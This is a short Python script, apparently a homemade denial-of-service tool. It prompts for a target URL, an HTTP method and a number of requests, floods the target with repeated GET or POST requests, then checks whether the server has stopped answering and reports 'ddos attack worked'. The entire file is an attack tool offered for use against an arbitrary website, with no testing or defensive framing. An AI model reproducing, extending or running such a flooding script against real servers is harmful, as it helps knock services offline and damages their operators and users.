import requests
import colorama
import os


green = colorama.Fore.GREEN
red = colorama.Fore.RED

url = input(green + "Enter the URL to attack: ")
method = input(green + "Enter the HTTP method (GET/POST/FETCH): ").upper()
numero = input(green + "Enter the number of requests to send: ")
input(green + "are you sure you want to attack this URL? (Press Enter to continue)")
os.system("cls" if os.name == "nt" else "clear")

for i in range(int(numero)):
    try:
        if method == "GET":
            response = requests.get(url)
        elif method == "POST":
            response = requests.post(url)
        elif method == "FETCH":
            response = requests.get(url)
        else:
            print(green + "Invalid method. Please use GET, POST, or FETCH.")
            break

        print(green + f"Request {i+1}: {response.status_code} - {response.text}")
    except Exception as e:
        print(green + f"Error: {e}")
        break

try:
    response = requests.get(url, timeout=5)
    if response.status_code == 200:
        print(red + "Server anwsered, ddos attack is not working")
    else:
        print(red + f"Server anwsered with error {response.status_code}")
except requests.exceptions.RequestException as e:
    print(green + f"ddos attack worked!!! server error:  {e}")